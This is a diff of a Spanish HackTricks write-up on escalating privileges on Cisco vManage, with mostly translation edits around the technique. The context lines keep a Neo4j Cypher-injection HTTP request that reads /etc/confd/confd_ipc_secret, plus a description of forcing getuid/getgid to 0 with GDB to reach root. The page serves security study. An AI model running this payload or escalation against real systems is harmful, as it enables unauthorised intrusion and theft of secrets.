@@ -7,7 +7,7 @@
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
@@ -22,7 +22,7 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Recuerda nuestra instancia de Neo4j? Se está ejecutando bajo los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo utilizando la vulnerabilidad anterior:
+Recuerda nuestra instancia de Neo4j? Está funcionando bajo los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo utilizando la vulnerabilidad anterior:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -94,13 +94,13 @@ vmanage:~$ ps aux
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Supuse que el programa "confd\_cli" pasa el ID de usuario y el ID de grupo que recopiló del usuario conectado a la aplicación "cmdptywrapper".
+Supuse que el programa "confd\_cli" pasa el ID de usuario e ID de grupo que recopiló del usuario conectado a la aplicación "cmdptywrapper".
 
-Mi primer intento fue ejecutar directamente "cmdptywrapper" y suministrarle `-g 0 -u 0`, pero falló. Parece que se creó un descriptor de archivo (-i 1015) en algún momento y no puedo falsificarlo.
+Mi primer intento fue ejecutar "cmdptywrapper" directamente y suministrarle `-g 0 -u 0`, pero falló. Parece que se creó un descriptor de archivo (-i 1015) en algún momento del proceso y no puedo falsificarlo.
 
 Como se mencionó en el blog de synacktiv (último ejemplo), el programa `confd_cli` no admite argumentos de línea de comandos, pero puedo influir en él con un depurador y afortunadamente GDB está incluido en el sistema.
 
-Creé un script de GDB donde forcé a la API `getuid` y `getgid` a devolver 0. Dado que ya tengo el privilegio "vmanage" a través de la RCE de deserialización, tengo permiso para leer directamente el `/etc/confd/confd_ipc_secret`.
+Creé un script de GDB donde forcé a la API `getuid` y `getgid` a devolver 0. Dado que ya tengo el privilegio "vmanage" a través de la RCE de deserialización, tengo permiso para leer directamente el archivo `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
 ```
@@ -160,8 +160,8 @@ bash-4.4#
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
